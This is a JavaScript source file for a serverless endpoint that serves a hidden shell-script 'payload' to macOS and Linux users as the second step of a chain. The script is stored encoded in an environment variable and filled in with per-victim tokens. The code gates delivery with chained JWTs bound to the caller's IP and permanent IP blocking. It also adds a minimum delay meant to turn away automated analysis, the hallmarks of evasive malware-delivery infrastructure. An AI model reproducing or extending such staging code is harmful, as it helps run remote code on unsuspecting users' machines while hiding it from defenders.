// api/task/tokenlinux.js
// STEP 2 — macOS / Linux  (serves tokenlinux.npl with {{STEP_TOKEN}} replaced by a step-2 JWT)
//
// Verifies the step-1 token (st), enforces minimum delay, injects step-2 token into the shell
// script template stored in the LINUX_PAYLOAD env var (base64 or plain text).
//
// Placeholders supported: {{DOMAIN}}, {{token}}, {{STEP_TOKEN}}

export const config = { runtime: 'edge' };

import {
  getIp, isIpBlocked, blockAndRespond,
  verifyStepToken, createStepToken, getBearerToken,
  getHost, urlParams, STEP_MIN_DELAY_MS,
  CORS, plainHeaders,
} from './_lib.js';

// ─────────────────────────────────────────────────────────
// Payload loader
// Store your tokenlinux.npl content in the LINUX_PAYLOAD env var (Vercel dashboard).
// Base64-encoded recommended for multiline shell scripts.
// ─────────────────────────────────────────────────────────
function loadPayload() {
  const raw = process.env.LINUX_PAYLOAD || '';
  if (!raw) {
    console.warn('[tokenlinux] LINUX_PAYLOAD env var not set — returning stub.');
    return '#!/bin/bash\necho "{{STEP_TOKEN}}"\n';
  }
  try {
    return atob(raw);
  } catch {
    return raw;
  }
}

export default async function handler(req) {
  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 200, headers: CORS });
  }

  const ip        = getIp(req);
  const params    = urlParams(req);
  const origToken = params.get('token') || '';
  const st        = params.get('st') || getBearerToken(req) || '';

  console.log('[tokenlinux] called by', ip, 'origToken=', origToken || '(none)');

  if (await isIpBlocked(ip)) {
    console.log('[tokenlinux] BLOCKED:', ip);
    return new Response('Access permanently suspended.', { status: 403, headers: CORS });
  }

  // ── Verify step-1 token ──────────────────────────────────
  const decoded = await verifyStepToken(st);
  if (!decoded) {
    return blockAndRespond(ip, 'Invalid or missing step-1 token (st)');
  }
  if (decoded.step !== 1) {
    return blockAndRespond(ip, `Wrong step in token: expected 1, got ${decoded.step}`);
  }
  if (decoded.ip !== ip) {
    return blockAndRespond(ip, 'IP mismatch between JWT and request (possible relay/forgery)');
  }
  if (decoded.origToken && origToken && String(decoded.origToken) !== String(origToken)) {
    return blockAndRespond(ip, 'origToken mismatch between steps');
  }

  // ── Enforce minimum delay ────────────────────────────────
  // Block if step-2 arrives too quickly — indicates automated replay, not a real user shell
  const elapsed = Date.now() - (decoded.timestamp || 0);
  console.log('[tokenlinux] elapsed since step-1 (ms):', elapsed);
  if (elapsed < STEP_MIN_DELAY_MS) {
    return blockAndRespond(ip, `Step-2 requested too fast (<${STEP_MIN_DELAY_MS}ms); automated replay suspected`);
  }

  // ── Issue step-2 token ───────────────────────────────────
  const st2 = await createStepToken(ip, decoded.sessionId, 2, origToken);

  // ── Build response ───────────────────────────────────────
  const domain    = getHost(req);
  const template  = loadPayload();
  let content     = template
    .replace(/{{DOMAIN}}/g,     domain)
    .replace(/{{token}}/g,      origToken)
    .replace(/{{STEP_TOKEN}}/g, st2);

  // Append if no placeholder existed
  if (!template.includes('{{STEP_TOKEN}}')) {
    content += `\n# STEP_TOKEN=${st2}\n:: STEP_TOKEN=${st2}\n`;
  }

  return new Response(content, { status: 200, headers: plainHeaders() });
}
